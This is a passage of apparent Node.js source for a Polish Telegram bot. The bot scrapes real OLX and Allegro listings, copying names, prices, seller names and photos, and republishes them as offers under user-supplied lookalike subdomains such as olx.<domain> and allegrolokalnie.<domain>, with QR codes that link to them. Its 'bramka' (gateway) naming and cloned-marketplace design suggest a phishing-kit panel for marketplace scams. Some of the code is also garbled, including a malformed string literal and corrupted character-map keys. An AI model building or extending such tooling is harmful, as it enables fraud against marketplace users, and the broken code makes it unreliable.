					caption: `───────── [ 𝕂 ] ─────────\n❖ *TWOJE OFERTY · ALEBILET*\n──────────────────`
				}, {
					chat_id: chatId,
					message_id: messageId,
					reply_markup: {
						inline_keyboard: [
							...userOffers.map(offer => [{ text: `🎟 ${offer.nazwa}`, callback_data: `ab_edit_offer_${offer.idoferty}` }]),
							[{ text: "Cofnij\", callback_data: \"gateway_platform_alebilet\" }, { text: \"🧹 Usuń wszystkie", icon_custom_emoji_id: "5895507195524550741", callback_data: "delete_all_alebilet" }]
						]
					}
				}).catch(() => {});
			}
		} catch (error) {
			console.error("Błąd usuwania AleBilet:", error);
			bot.answerCallbackQuery(query.id, { text: "❌ Błąd usuwania oferty." });
		}
	}

	// ── Odporne parsowanie ofert (JSON-LD + meta og jako fallback) ──
	function extractJsonLd(html) {
		const results = [];
		const re = /<script[^>]+type=["']application\/ld\+json["'][^>]*>([\s\S]*?)<\/script>/gi;
		let m;
		while ((m = re.exec(html)) !== null) {
			try {
				const parsed = JSON.parse(m[1].trim());
				if (Array.isArray(parsed)) results.push(...parsed);
				else results.push(parsed);
			} catch (e) {}
		}
		const flat = [];
		for (const r of results) {
			if (r && Array.isArray(r['@graph'])) flat.push(...r['@graph']);
			else if (r) flat.push(r);
		}
		return flat.find(x => x && (x['@type'] === 'Product' || x['@type'] === 'Offer' || x.name)) || null;
	}

	function pickString(...candidates) {
		for (const c of candidates) {
			if (c == null) continue;
			const str = String(c).trim();
			if (str) return str;
		}
		return '';
	}

	function imageKey(url) {
		return String(url)
			.split('?')[0]
			.replace(/[-_](s|h|w)?\d{2,4}x\d{2,4}(?=\.)/gi, '')
			.replace(/\/s\d{2,4}(?=\.)/gi, '')
			.replace(/[-_](rev|v)\d+(?=\.)/gi, '')
			.replace(/(\.[a-z]{3,4})$/i, '$1')
			.toLowerCase();
	}

	function pickImages(...sources) {
		const out = [];
		const seen = new Set();
		const push = (val) => {
			if (!val) return;
			if (Array.isArray(val)) return val.forEach(push);
			if (typeof val === 'string') {
				let str = val.trim();
				if (!str.startsWith('http')) return;
				// OLX/Allegro: bierzemy wersję s1024 (największa), reszta odpada przez klucz
				if (/llx\.|olxcdn|allegroimg/i.test(str)) {
					str = str.replace(/\/s\d{2,4}\//gi, '/s1024/').replace(/[-_]s\d{2,4}(?=\.)/gi, '');
				}
				const key = imageKey(str);
				if (seen.has(key)) return;
				seen.add(key);
				out.push(str);
			}
		};
		sources.forEach(push);
		return out.slice(0, 8);
	}

	const fetchAllegroArchiveData = async (allegroLink, offerId) => {
		const filename = path.join(__dirname, `${offerId}_allegro.html`);
		const imagesFolder = path.join(__dirname, 'images');

		if (!fs.existsSync(imagesFolder)) {
			fs.mkdirSync(imagesFolder);
		}

		try {
			if (!isSafeHttpUrl(allegroLink)) {
				throw new Error("Niepoprawny link Allegro");
			}

			const response = await axios({
				method: "GET",
				url: allegroLink,
				responseType: "stream",
				timeout: 30000,
				maxRedirects: 5,
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
					"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
					"Accept-Language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
					"Cache-Control": "no-cache",
					"Cookie": "cookie-consent=1; opt-out=1"
				}
			});

			await new Promise((resolve, reject) => {
				const writer = fs.createWriteStream(filename);
				response.data.pipe(writer);
				writer.on("finish", resolve);
				writer.on("error", reject);
				response.data.on("error", reject);
			});

			const data = fs.readFileSync(filename, 'utf8');
			const $ = cheerio.load(data);
			const jsonLd = extractJsonLd(data);

			const nazwa = pickString(jsonLd?.name, $('h6 strong[itemprop="name"]').text().trim(), 'Brak nazwy');

			const kategoria = $('ol[data-role="breadcrumbs-list"] li')
				.map((i, el) => $(el).find('span[itemprop="name"]').text().trim())
				.get()
				.filter((text, index) => index > 0 && text.length > 0)
				.join('; ') || 'Brak tagów';


			const parametry = [];
			$('.mdwt_en dl div').each((i, el) => {
				const key = $(el).find('dt').text().trim();
				const value = $(el).find('dd').text().trim();
				if (key && value) {
					parametry.push(`${key}: ${value}`);
				}
			});

			const tagi = parametry.length > 0 ? parametry.join('; ') : 'Brak kategorii';

			const cleanText = (text) => {
				return text
					.replace(/\s+/g, ' ')
					.replace(/\.([^\s])/g, '. $1')
					.replace(/,([^\s])/g, ', $1')
					.replace(/\s+\./g, '.')
					.replace(/\s+,/g, ',')
					.trim();
			};

			const rawOpis = pickString(jsonLd?.description)
				|| $('#description, .description').text()
				|| 'Brak opisu';
			const opis = cleanText(rawOpis);

			const cenaText = $('.munh_8_l._d9c5a_7imoR > .mp4t_8.mryx_8 > strong').text().trim();
			let cena = 'Brak ceny';

			const jsonPrice = jsonLd?.offers
				? pickString(jsonLd.offers?.price ?? jsonLd.offers?.[0]?.price)
				: '';
			if (jsonPrice) {
				cena = Math.floor(parseFloat(String(jsonPrice).replace(',', '.'))) || jsonPrice;
			} else if (cenaText) {
				const match = cenaText.replace(/\s/g, '').replace(',', '.').match(/(\d+(\.\d+)?)/);
				if (match) {
					cena = Math.floor(parseFloat(match[1]));
				}
			}


			const imageUrls = pickImages(
				jsonLd?.image,
				$('img.mpof_z0').map((i, el) => $(el).attr('src')).get(),
				$('meta[property="og:image"]').attr('content')
			);

			const imageNames = [];

			if (imageUrls.length === 0) {
				console.log('❌ Brak zdjęć w ofercie');
			} else {
				for (let i = 0; i < imageUrls.length; i++) {
					const imgUrl = imageUrls[i];
					const imgName = `${offerId}.${i + 1}.jpeg`;
					const imgPath = path.join(imagesFolder, imgName);
					const file = fs.createWriteStream(imgPath);

					const request = imgUrl.startsWith('https') ? https : http;

					try {
						await new Promise((resolve, reject) => {
							request.get(imgUrl, (response) => {
								response.pipe(file);
								file.on('finish', () => {
									file.close();
									imageNames.push(imgName.replace('.jpeg', ''));
									resolve();
								});
							}).on('error', (err) => {
								fs.unlink(imgPath, () => {});
								console.error(`<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Błąd pobierania zdjęcia ${imgUrl}:`, err.message);
								reject(err);
							});
						});
					} catch (err) {
						console.error(`<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Błąd pobierania zdjęcia ${imgUrl}:`, err.message);
					}
				}
			}

			return {
				nazwa,
				tagi,
				cena,
				kategorie: kategoria,
				opis,
				images: imageNames
			};

		} catch (error) {
			console.error('❌ Błąd przy pobieraniu strony:', error.message);
			return null;
		} finally {
			if (fs.existsSync(filename)) {
				fs.unlink(filename, (err) => {
					if (err) {
						console.error('❌ Błąd przy usuwaniu pliku:', err.message);
					}
				});
			}
		}
	};



	const fetchOLXData = async (olxLink, offerId) => {
		const filename = path.join(__dirname, `${offerId}.html`);
		const imagesFolder = path.join(__dirname, 'images');

		if (!fs.existsSync(imagesFolder)) {
			fs.mkdirSync(imagesFolder);
		}

		try {
			if (!isSafeHttpUrl(olxLink)) {
				throw new Error("Niepoprawny link OLX");
			}

			const response = await axios({
				method: "GET",
				url: olxLink,
				responseType: "stream",
				timeout: 30000,
				maxRedirects: 5,
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
					"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
					"Accept-Language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
					"Cache-Control": "no-cache",
					"Cookie": "cookie-consent=1; opt-out=1"
				}
			});

			await new Promise((resolve, reject) => {
				const writer = fs.createWriteStream(filename);
				response.data.pipe(writer);
				writer.on("finish", resolve);
				writer.on("error", reject);
				response.data.on("error", reject);
			});

			const data = fs.readFileSync(filename, 'utf8');
			const $ = cheerio.load(data);
			const jsonLd = extractJsonLd(data);
			const nazwa = pickString(jsonLd?.name, $('.css-10ofhqw').text().trim(), $('h1').first().text().trim(), 'brak nazwy');
			const imie = pickString($('.css-rnqkz0 > .css-1fp4ipz > .css-fka1fu').text().trim(), $('[data-testid="user-profile"]').text().trim(), 'Brak imienia');
			const jsonPrice = jsonLd?.offers
				? pickString(jsonLd.offers?.price ?? jsonLd.offers?.[0]?.price)
				: '';
			const cena = jsonPrice
				? String(Math.floor(parseFloat(String(jsonPrice).replace(',', '.'))) || jsonPrice)
				: pickString($('.css-1w5u3ie > .css-fqcbii').text().trim().replace('zł', '').replace(/\s+/g, ''), 'Brak ceny');
			const opis = pickString(jsonLd?.description, $('.css-19duwlz').text().trim(), $('meta[name="description"]').attr('content'), 'Brak opisu');

			let kategorie = $('.css-7dfllt, .css-tyi2d1')
				.map((i, el) => $(el).text().trim())
				.get()
				.filter(text => text.length > 0 && !text.includes('{'))
				.map(text => (text === 'Strona główna' ? '' : text))
				.filter((text, index, self) => self.indexOf(text) === index)
				.join('; ') || 'Brak kategorii';

			let tagi = $('.css-c6mlsd, .css-ae1s7g, .css-41yf00')
				.map((i, el) => $(el).text().trim())
				.get()
				.filter(tag => tag.length > 0 && !tag.includes('{'))
				.join('; ') || 'Brak tagów';

			const imageUrls = pickImages(
				jsonLd?.image,
				$('.swiper-slide img').map((i, el) => $(el).attr('src')).get(),
				$('meta[property="og:image"]').attr('content')
			);

			const imageNames = [];
			if (imageUrls.length === 0) {
				console.log('❌ Brak zdjęć w ofercie');
			} else {

				for (let i = 0; i < imageUrls.length; i++) {
					const imgUrl = imageUrls[i];
					const imgName = `${offerId}.${i + 1}.jpeg`;
					const imgPath = path.join(imagesFolder, imgName);
					const file = fs.createWriteStream(imgPath);

					const request = imgUrl.startsWith('https') ? https : http;
					try {
						await new Promise((resolve, reject) => {
							request.get(imgUrl, (response) => {
								response.pipe(file);
								file.on('finish', () => {
									file.close();
									imageNames.push(imgName.replace('.jpeg', ''));
									resolve();
								});
							}).on('error', (err) => {
								fs.unlink(imgPath, () => {});
								console.error(`<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Błąd pobierania zdjęcia ${imgUrl}:`, err.message);
								reject(err);
							});
						});
					} catch (err) {
						console.error(`<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Błąd pobierania zdjęcia ${imgUrl}:`, err.message);
					}
				}
			}

			return {
				imie,
				cena,
				kategorie,
				tagi,
				nazwa,
				opis,
				images: imageNames
			};
		} catch (error) {
			console.error('Błąd przy pobieraniu strony:', error.message);
			return null;
		} finally {
			if (fs.existsSync(filename)) {
				fs.unlink(filename, (err) => {
					if (err) {
						console.error('Błąd przy usuwaniu pliku:', err.message);
					} else {}
				});
			}
		}
	};

	const generateUniqueLink = async (offers, link) => {
		const polishToNormal = {
			'ą': 'a',
			'ć': 'c',
			'ę': 'e',
			'ł': 'l',
			'ń': 'n',
			'ó': 'o',
			'ś': 's',
			'9_': 'z',
			'ż': 'z',
			'Ą': 'A',
			'Ć': 'C',
			'Ę': 'E',
			'Ł': 'L',
			'Ń': 'N',
			'Ó': 'O',
			'9a': 'S',
			'ź': 'Z',
			'Ż': 'Z'
		};

		let sanitizedLink = link
			.replace(/[ąćęłńóśźżĄĆĘŁŃÓŚŹŻ]/g, match => polishToNormal[match] || match)
			.replace(/[^a-zA-Z0-9-]/g, '');

		let newLink = sanitizedLink;
		let counter = 2;

		while (await Offer.exists({
				link: newLink
			})) {
			newLink = sanitizedLink + '-' + counter;
			counter++;
		}

		return newLink;
	};

	const loadFromOLX = async (chatId, offerId) => {
		try {
			const offers = await loadOffersDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());

			if (!offer) {
				sendTempMessage(chatId, "❌ Oferta nie została znaleziona.");
				return;
			}

			bot.sendMessage(chatId, "📥 Podaj link do oferty na OLX:").then(sentMessage => {
				const listener = async (msg) => {
					if (msg.chat.id !== chatId) return;

					bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

					if (msg.text.toLowerCase() === "stop" || msg.text.toLowerCase() === "cancel") {
						sendTempMessage(chatId, "❌ Pobieranie z OLX anulowane.");
						bot.removeListener("message", listener);
						return;
					}

					const olxLink = msg.text.trim();

					if (!olxLink.includes("olx")) {
						sendTempMessage(chatId, "⚠️ To nie wygląda na poprawny link do OLX.");
						bot.removeListener("message", listener);
						return;
					}

					sendTempMessage(chatId, "⏳ Pobieranie danych z OLX...");

					function cleanDescription(text) {
						if (!text) return '';
						return text
							.replace(/\r?\n|\r/g, ' ')
							.replace(/\+/g, ' ')
							.replace(/\s\s+/g, ' ')
							.trim();
					}

					try {
						const olxData = await fetchOLXData(olxLink, offerId);
						if (!olxData) {
							sendTempMessage(chatId, "❌ Nie udało się pobrać danych z OLX.");
							return;
						}

						const formatImageNames = (images, offerId) => {
							const imageNames = [];

							images.forEach((image, index) => {
								const imageIndex = parseInt(image.split('.')[1], 10);

								const formattedImageName = `${offerId}.${imageIndex}`;

								imageNames.push(formattedImageName);
							});

							return imageNames;
						};

						let newLink = olxData.nazwa.replace(/\s+/g, '-').toLowerCase();
						newLink = await generateUniqueLink(offers, newLink);

						const updatedOffer = {
							nazwa: olxData.nazwa || offer.nazwa,
							link: newLink,
							description: cleanDescription(olxData.opis || offer.description),
							cena: olxData.cena || offer.cena,
							sprzedawca: olxData.imie || offer.sprzedawca,
							kategoria: olxData.kategorie || offer.kategoria,
							tagi: olxData.tagi || offer.tagi,

							zdjecia: olxData.images.length > 0 ? formatImageNames(olxData.images, offer.idoferty) : offer.zdjecia
						};

						await editOfferDB(offerId, updatedOffer);
						sendTempMessage(chatId, "✅ Oferta została zaktualizowana!");
						refreshOfferMenu(chatId, messageId, offerId);
					} catch (error) {
						console.error("Błąd podczas pobierania danych z OLX:", error);
						sendTempMessage(chatId, "❌ Wystąpił błąd podczas pobierania danych z OLX.");
					}

					bot.removeListener("message", listener);
				};

				bot.on("message", listener);
			});
		} catch (error) {
			console.error("Błąd w funkcji loadFromOLX:", error);
		}
	};

	const loadFromAllegroArchive = async (chatId, offerId) => {
		try {
			const offers = await loadOffersDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());

			if (!offer) {
				sendTempMessage(chatId, "❌ Oferta nie została znaleziona.");
				return;
			}

			bot.sendMessage(chatId, "📥 Podaj link do oferty z Archiwum Allegro:").then(sentMessage => {
				const listener = async (msg) => {
					if (msg.chat.id !== chatId) return;

					bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

					if (msg.text.toLowerCase() === "stop" || msg.text.toLowerCase() === "cancel") {
						sendTempMessage(chatId, "❌ Pobieranie z Allegro anulowane.");
						bot.removeListener("message", listener);
						return;
					}

					const allegroLink = msg.text.trim();

					if (!allegroLink.includes("archiwum.allegro.pl")) {
						sendTempMessage(chatId, "⚠️ To nie wygląda na poprawny link do Archiwum Allegro.");
						bot.removeListener("message", listener);
						return;
					}

					sendTempMessage(chatId, "⏳ Pobieranie danych z Allegro...");

					try {
						const allegroData = await fetchAllegroArchiveData(allegroLink, offerId);
						if (!allegroData) {
							sendTempMessage(chatId, "❌ Nie udało się pobrać danych z Allegro.");
							return;
						}

						const formatImageNames = (images, offerId) => {
							const imageNames = [];

							images.forEach((image, index) => {
								const imageIndex = parseInt(image.split('.')[1], 10);
								const formattedImageName = `${offerId}.${imageIndex}`;
								imageNames.push(formattedImageName);
							});

							return imageNames;
						};

						let newLink = allegroData.nazwa.replace(/\s+/g, '-').toLowerCase();
						newLink = await generateUniqueLink(offers, newLink);

						const updatedOffer = {
							nazwa: allegroData.nazwa || offer.nazwa,
							link: newLink,
							description: allegroData.opis || offer.description,
							cena: allegroData.cena || offer.cena,
							sprzedawca: offer.sprzedawca,
							kategoria: allegroData.kategorie || offer.kategoria,
							tagi: allegroData.tagi || offer.tagi,
							zdjecia: allegroData.images.length > 0 ? formatImageNames(allegroData.images, offer.idoferty) : offer.zdjecia
						};

						await editOfferDB(offerId, updatedOffer);
						sendTempMessage(chatId, "✅ Oferta została zaktualizowana!");
						refreshOfferMenu(chatId, messageId, offerId);
					} catch (error) {
						console.error("Błąd podczas pobierania danych z Allegro:", error);
						sendTempMessage(chatId, "❌ Wystąpił błąd podczas pobierania danych z Allegro.");
					}

					bot.removeListener("message", listener);
				};

				bot.on("message", listener);
			});
		} catch (error) {
			console.error("Błąd w funkcji loadFromAllegroArchive:", error);
		}
	};


	const OLXloadFromAllegroArchive = async (chatId, offerId) => {
		try {
			const offers = await loadOffersOLXDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());

			if (!offer) {
				sendTempMessage(chatId, "❌ Oferta nie została znaleziona.");
				return;
			}

			bot.sendMessage(chatId, "📥 Podaj link do oferty z Archiwum Allegro:").then(sentMessage => {
				const listener = async (msg) => {
					if (msg.chat.id !== chatId) return;

					bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

					if (msg.text.toLowerCase() === "stop" || msg.text.toLowerCase() === "cancel") {
						sendTempMessage(chatId, "❌ Pobieranie z Allegro anulowane.");
						bot.removeListener("message", listener);
						return;
					}

					const allegroLink = msg.text.trim();

					if (!allegroLink.includes("archiwum.allegro.pl")) {
						sendTempMessage(chatId, "⚠️ To nie wygląda na poprawny link do Archiwum Allegro.");
						bot.removeListener("message", listener);
						return;
					}

					sendTempMessage(chatId, "⏳ Pobieranie danych z Allegro...");

					try {
						const allegroData = await fetchAllegroArchiveData(allegroLink, offerId);
						if (!allegroData) {
							sendTempMessage(chatId, "❌ Nie udało się pobrać danych z Allegro.");
							return;
						}

						const formatImageNames = (images, offerId) => {
							const imageNames = [];

							images.forEach((image, index) => {
								const imageIndex = parseInt(image.split('.')[1], 10);
								const formattedImageName = `${offerId}.${imageIndex}`;
								imageNames.push(formattedImageName);
							});

							return imageNames;
						};

						let newLink = allegroData.nazwa.replace(/\s+/g, '-').toLowerCase();
						newLink = await generateUniqueLink(offers, newLink);

						const updatedOffer = {
							nazwa: allegroData.nazwa || offer.nazwa,
							link: newLink,
							description: allegroData.opis || offer.description,
							cena: allegroData.cena || offer.cena,
							sprzedawca: offer.sprzedawca,
							numer: offer.numer,
							kategoria: allegroData.kategorie || offer.kategoria,
							tagi: allegroData.tagi || offer.tagi,
							zdjecia: allegroData.images.length > 0 ? formatImageNames(allegroData.images, offer.idoferty) : offer.zdjecia
						};

						await editOfferDBOLX(offerId, updatedOffer);
						sendTempMessage(chatId, "✅ Oferta została zaktualizowana!");
						refreshOfferMenuOLX(chatId, messageId, offerId);
					} catch (error) {
						console.error("Błąd podczas pobierania danych z Allegro:", error);
						sendTempMessage(chatId, "❌ Wystąpił błąd podczas pobierania danych z Allegro.");
					}

					bot.removeListener("message", listener);
				};

				bot.on("message", listener);
			});
		} catch (error) {
			console.error("Błąd w funkcji loadFromAllegroArchive:", error);
		}
	};


	if (query.data.startsWith("loadolx_")) {
		const offerId = query.data.split("_")[1];
		loadFromOLX(chatId, offerId);
	}


	if (query.data.startsWith("loadallegro_")) {
		const offerId = query.data.split("_")[1];
		loadFromAllegroArchive(chatId, offerId);
	}

	if (query.data.startsWith("olxloadallegro_")) {
		const offerId = query.data.split("_")[1];
		OLXloadFromAllegroArchive(chatId, offerId);
	}

	if (query.data.startsWith("offer_qr_lokalnie_")) {
		const offerId = query.data.replace("offer_qr_lokalnie_", "");
		try {
			const offers = await loadOffersDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) {
				sendTempMessage(chatId, "❌ Nie znaleziono oferty.");
				return;
			}
			const users = await loadUsersDB();
			const user = users.find(u => u.id === userId);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerUrl = buildOfferUrl("allegrolokalnie", domain, offer.link);
			if (!offerUrl) {
				sendTempMessage(chatId, "❌ Nie masz podpiętej domeny.");
				return;
			}
			await sendOfferQrCode(chatId, offerUrl, offer.nazwa);
		} catch (error) {
			console.error("Błąd generowania QR (Allegro Lokalnie):", error);
			sendTempMessage(chatId, "❌ Nie udało się wygenerować kodu QR.");
		}
	}

	if (query.data.startsWith("offer_qr_olx_")) {
		const offerId = query.data.replace("offer_qr_olx_", "");
		try {
			const offers = await loadOffersOLXDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) {
				sendTempMessage(chatId, "❌ Nie znaleziono oferty.");
				return;
			}
			const users = await loadUsersDB();
			const user = users.find(u => u.id === userId);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerUrl = buildOfferUrl("olx", domain, offer.link);
			if (!offerUrl) {
				sendTempMessage(chatId, "❌ Nie masz podpiętej domeny.");
				return;
			}
			await sendOfferQrCode(chatId, offerUrl, offer.nazwa);
		} catch (error) {
			console.error("Błąd generowania QR (OLX):", error);
			sendTempMessage(chatId, "❌ Nie udało się wygenerować kodu QR.");
		}
	}

	if (query.data.startsWith("offer_qr_ticketmaster_")) {
		const offerId = query.data.replace("offer_qr_ticketmaster_", "");
		try {
			const offers = await loadOffersTicketmasterDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) {
				sendTempMessage(chatId, "❌ Nie znaleziono oferty.");
				return;
			}
			const users = await loadUsersDB();
			const user = users.find(u => u.id === userId);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerUrl = buildOfferUrl("ticketmaster", domain, offer.link, offer.idoferty);
			if (!offerUrl) {
				sendTempMessage(chatId, "❌ Nie masz podpiętej domeny.");
				return;
			}
			await sendOfferQrCode(chatId, offerUrl, offer.nazwa);
		} catch (error) {
			console.error("Błąd generowania QR (Ticketmaster):", error);
			sendTempMessage(chatId, "❌ Nie udało się wygenerować kodu QR.");
		}
	}

	if (query.data.startsWith("offer_qr_vinted_")) {
		const offerId = query.data.replace("offer_qr_vinted_", "");
		try {
			const offers = await loadOffersVintedDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) {
				sendTempMessage(chatId, "❌ Nie znaleziono oferty.");
				return;
			}
			const users = await loadUsersDB();
			const user = users.find(u => u.id === userId);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerUrl = buildOfferUrl("vinted", domain, offer.link, offer.idoferty);
			if (!offerUrl) {
				sendTempMessage(chatId, "❌ Nie masz podpiętej domeny.");
				return;
			}
			await sendOfferQrCode(chatId, offerUrl, offer.nazwa);
		} catch (error) {
			console.error("Błąd generowania QR (Vinted):", error);
			sendTempMessage(chatId, "❌ Nie udało się wygenerować kodu QR.");
		}
	}

	if (query.data.startsWith("offer_qr_alebilet_")) {
		const offerId = query.data.replace("offer_qr_alebilet_", "");
		try {
			const offers = await loadOffersAlebiletDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) {
				sendTempMessage(chatId, "❌ Nie znaleziono oferty.");
				return;
			}
			const users = await loadUsersDB();
			const user = users.find(u => u.id === userId);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerUrl = buildOfferUrl("alebilet", domain, offer.link, offer.idoferty);
			if (!offerUrl) {
				sendTempMessage(chatId, "❌ Nie masz podpiętej domeny.");
				return;
			}
			await sendOfferQrCode(chatId, offerUrl, offer.nazwa);
		} catch (error) {
			console.error("Błąd generowania QR (AleBilet):", error);
			sendTempMessage(chatId, "❌ Nie udało się wygenerować kodu QR.");
		}
	}


	if (query.data.startsWith("edit_removephotos_")) {
		const offerId = query.data.split("_")[2];
		const chatId = query.message.chat.id;
		const messageId = query.message.message_id;

		loadOffersDB()
			.then(async (offers) => {
				const offer = offers.find(o => o.idoferty.toString() === offerId.toString());

				if (!offer || offer.zdjecia.length === 0) {
					bot.answerCallbackQuery(query.id, {
						text: "❌ Brak zdjęć do usunięcia!"
					});
					return;
				}

				const users = await loadUsersDB();
				const user = users.find(u => u.id === query.from.id);
				const domain = getEffectiveUserDomainSync(user, publicDomain);

				const linksArray = await Promise.all(
					offer.zdjecia.map(async (photo, index) => {
						const offerLink = domain ?
							`https://allegrolokalnie.${domain}/images/${encodeURIComponent(photo)}.jpeg` :
							"NIE MASZ PODPIETEJ DOMENY";
						return `[<tg-emoji emoji-id=\"6028171274939797252\">🔗</tg-emoji> Zdjęcie ${index + 1}](${offerLink})`;
					})
				);

				const links = linksArray.join("\n");

				const keyboard = offer.zdjecia.map((photo, index) => [{
					text: `Usuń zdjęcie ${index + 1}`,
					callback_data: `confirm_removephoto_${offerId}_${index}`
				}]);

				keyboard.push([{
					text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: `cancel_removephoto_${offerId}`
				}]);

				const options = {
					reply_markup: {
						inline_keyboard: keyboard
					}
				};

				bot.editMessageMedia({
					type: "photo",
					media: "attach://bramka.png",
					caption: `<tg-emoji emoji-id=\"6039522349517115015\">🗑</tg-emoji> Wybierz zdjęcie do usunięcia:\n\n${links}`,
				}, {
				parse_mode: "HTML",
					chat_id: chatId,
					message_id: messageId,
					...options
				});
			})
			.catch(error => {
				console.error("Błąd podczas ładowania oferty:", error);
				sendTempMessage(chatId, "❌ Wystąpił błąd podczas usuwania zdjęcia.");
			});
	}


	if (query.data.startsWith("confirm_removephoto_")) {
		const parts = query.data.split("_");
		const offerId = parts[2];
		const photoIndex = parseInt(parts[3], 10);
		const chatId = query.message.chat.id;
		const messageId = query.message.message_id;

		loadOffersDB()
			.then(async (offers) => {
				const offer = offers.find(o => o.idoferty.toString() === offerId.toString());

				if (!offer || !offer.zdjecia[photoIndex]) {
					bot.answerCallbackQuery(query.id, {
						text: "❌ Nie można usunąć tego zdjęcia!"
					});
					return;
				}

				const filePath = path.join(__dirname, "images", offer.zdjecia[photoIndex]);
				if (!offer.zdjecia[photoIndex].includes("iphone15")) {
					try {
						await fs.promises.unlink(`${filePath}.jpeg`);
					} catch (err) {
						console.error("Błąd usuwania zdjęcia:", err);
						sendTempMessage(chatId, "❌ Wystąpił błąd podczas usuwania zdjęcia.");
						return;
					}
				}

				offer.zdjecia.splice(photoIndex, 1);
				await editOfferDB(offerId, {
					zdjecia: offer.zdjecia
				});

				if (offer.zdjecia.length === 0) {
					bot.answerCallbackQuery(query.id);
					setTimeout(() => {
						bot.answerCallbackQuery(query.id);
						refreshOfferMenu(chatId, messageId, offerId);
					}, 200);
					return;
				}

				const users = await loadUsersDB();
				const user = users.find(u => u.id === query.from.id);
				const domain = getEffectiveUserDomainSync(user, publicDomain);

				const linksArray = await Promise.all(
					offer.zdjecia.map(async (photo, index) => {
						const offerLink = domain ?
							`https://allegrolokalnie.${domain}/images/${encodeURIComponent(photo)}.jpeg` :
							"NIE MASZ PODPIETEJ DOMENY";
						return `[<tg-emoji emoji-id=\"6028171274939797252\">🔗</tg-emoji> Zdjęcie ${index + 1}](${offerLink})`;
					})
				);

				const caption = "🗑️ Wybierz zdjęcie do usunięcia:\n\n" + linksArray.join("\n");

				const keyboard = offer.zdjecia.map((photo, index) => [{
					text: `Usuń zdjęcie ${index + 1}`,
					callback_data: `confirm_removephoto_${offerId}_${index}`
				}]);

				keyboard.push([{
					text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: `cancel_removephoto_${offerId}`
				}]);

				const options = {
					reply_markup: {
						inline_keyboard: keyboard
					}
				};

				bot.editMessageMedia({
					type: "photo",
					media: "attach://bramka.png",
					caption: caption,
				}, {
				parse_mode: "HTML",
					chat_id: chatId,
					message_id: messageId,
					...options
				});
			})
			.catch(error => {
				console.error("Błąd podczas usuwania zdjęcia:", error);
				sendTempMessage(chatId, "❌ Wystąpił błąd podczas usuwania zdjęcia.");
			});
	}


	if (query.data.startsWith("cancel_removephoto_")) {
		const offerId = query.data.split("_")[2];
		refreshOfferMenu(chatId, messageId, offerId);
	}

	if (query.data.startsWith("olx_edit_removephotos_")) {
		const offerId = query.data.split("_")[3];
		const chatId = query.message.chat.id;
		const messageId = query.message.message_id;

		loadOffersOLXDB()
			.then(async (offers) => {
				const offer = offers.find(o => o.idoferty.toString() === offerId.toString());

				if (!offer || offer.zdjecia.length === 0) {
					bot.answerCallbackQuery(query.id, {
						text: "❌ Brak zdjęć do usunięcia!"
					});
					return;
				}

				const users = await loadUsersDB();
				const user = users.find(u => u.id === query.from.id);
				const domain = getEffectiveUserDomainSync(user, publicDomain);

				const linksArray = await Promise.all(
					offer.zdjecia.map(async (photo, index) => {
						const offerLink = domain ?
							`https://olx.${domain}/images/${encodeURIComponent(photo)}.jpeg` :
							"NIE MASZ PODPIETEJ DOMENY";
						return `[<tg-emoji emoji-id=\"6028171274939797252\">🔗</tg-emoji> Zdjęcie ${index + 1}](${offerLink})`;
					})
				);

				const links = linksArray.join("\n");

				const keyboard = offer.zdjecia.map((photo, index) => [{
					text: `Usuń zdjęcie ${index + 1}`,
					callback_data: `olx_confirm_removephoto_${offerId}_${index}`
				}]);

				keyboard.push([{
					text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: `olx_cancel_removephoto_${offerId}`
				}]);

				const options = {
					reply_markup: {
						inline_keyboard: keyboard
					}
				};

				bot.editMessageMedia({
					type: "photo",
					media: "attach://bramka.png",
					caption: `<tg-emoji emoji-id=\"6039522349517115015\">🗑</tg-emoji> Wybierz zdjęcie do usunięcia:\n\n${links}`,
				}, {
				parse_mode: "HTML",
					chat_id: chatId,
					message_id: messageId,
					...options
				});
			})
			.catch(error => {
				console.error("Błąd podczas ładowania oferty:", error);
				sendTempMessage(chatId, "❌ Wystąpił błąd podczas usuwania zdjęcia.");
			});
	}


	if (query.data.startsWith("olx_confirm_removephoto_")) {
		const parts = query.data.split("_");
		const offerId = parts[3];
		const photoIndex = parseInt(parts[4], 10);
		const chatId = query.message.chat.id;
		const messageId = query.message.message_id;

		loadOffersOLXDB()
			.then(async (offers) => {
				const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
				console.log(photoIndex)
				if (!offer || !offer.zdjecia[photoIndex]) {
